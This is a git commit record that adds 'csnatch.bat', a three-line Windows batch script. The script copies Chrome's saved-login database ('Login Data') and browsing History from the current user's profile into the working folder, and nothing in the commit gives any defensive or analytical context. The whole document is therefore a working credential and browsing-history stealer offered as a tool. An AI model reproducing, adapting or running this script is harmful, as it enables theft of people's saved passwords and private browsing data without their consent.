d1a28b86e6f751a7e7f977523ef43175e1b80e5b
petricore1337 <48709405+petricore1337@users.noreply.github.com>
2019-03-23 19:13:58 +1300

    csnatch 1.0

---
+++ source/1.0/csnatch.bat
@@ -0,0 +1,3 @@
+@echo off
+copy "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%cd%"
+copy "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\History" "%cd%"
